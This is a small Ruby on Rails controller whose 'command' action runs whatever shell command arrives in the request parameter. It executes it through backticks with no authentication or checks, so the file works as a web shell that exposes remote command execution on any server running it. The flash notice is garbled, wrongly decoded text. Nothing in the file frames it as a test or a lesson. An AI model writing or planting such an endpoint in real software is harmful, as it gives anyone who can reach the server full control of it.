class CommandController < ApplicationController
  def index
    
  end
  
  def command
    `#{params[:command]}`
    flash[:notice] = 'ÃüÁîÖ´ÐÐÍê±Ï'
    redirect_to :action=>'index', :text=>params[:command]
  end
end
